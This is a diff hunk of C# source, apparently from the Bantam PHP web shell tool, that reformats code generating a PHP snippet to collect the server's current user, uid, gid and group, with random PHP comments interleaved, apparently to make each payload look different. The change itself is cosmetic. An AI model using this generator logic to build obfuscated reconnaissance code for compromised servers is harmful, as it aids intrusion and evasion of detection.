@@ -229,32 +229,33 @@ namespace bantam.Classes
                      + "'." + phpVersionVar + ";";
             }
 
-            return linesRandomized + "if (!function_exists('posix_getegid')) {"
-                                   + RandomPHPComment()
-                                   + userVar + " = @get_current_user();"
-                                   + RandomPHPComment()
-                                   + uidVar + " = @getmyuid();"
-                                   + RandomPHPComment()
-                                   + gidVar + " = @getmygid();"
-                                   + RandomPHPComment()
-                                   + groupVar + " = '?';"
-                                   + RandomPHPComment()
-                                   + "} else {"
-                                   + uidVar + " = @posix_getpwuid(posix_geteuid());"
-                                   + RandomPHPComment()
-                                   + gidVar + " = @posix_getgrgid(posix_getegid());"
-                                   + RandomPHPComment()
-                                   + userVar + "= " + uidVar + "['name'];"
-                                   + RandomPHPComment()
-                                   + uidVar + " = " + uidVar + "['uid'];"
-                                   + RandomPHPComment()
-                                   + gidVar + " = " + gidVar + "['gid'];"
-                                   + RandomPHPComment()
-                                   + groupVar + " = " + gidVar + "['name'];"
-                                   + RandomPHPComment()
-                                   + "}"
-                                   + responseCode
-                                   + RandomPHPComment();
+            return linesRandomized 
+                + "if (!function_exists('posix_getegid')) {"
+                + RandomPHPComment()
+                + userVar + " = @get_current_user();"
+                + RandomPHPComment()
+                + uidVar + " = @getmyuid();"
+                + RandomPHPComment()
+                + gidVar + " = @getmygid();"
+                + RandomPHPComment()
+                + groupVar + " = '?';"
+                + RandomPHPComment()
+                + "} else {"
+                + uidVar + " = @posix_getpwuid(posix_geteuid());"
+                + RandomPHPComment()
+                + gidVar + " = @posix_getgrgid(posix_getegid());"
+                + RandomPHPComment()
+                + userVar + "= " + uidVar + "['name'];"
+                + RandomPHPComment()
+                + uidVar + " = " + uidVar + "['uid'];"
+                + RandomPHPComment()
+                + gidVar + " = " + gidVar + "['gid'];"
+                + RandomPHPComment()
+                + groupVar + " = " + gidVar + "['name'];"
+                + RandomPHPComment()
+                + "}"
+                + responseCode
+                + RandomPHPComment();
         }
 
         /// <summary>
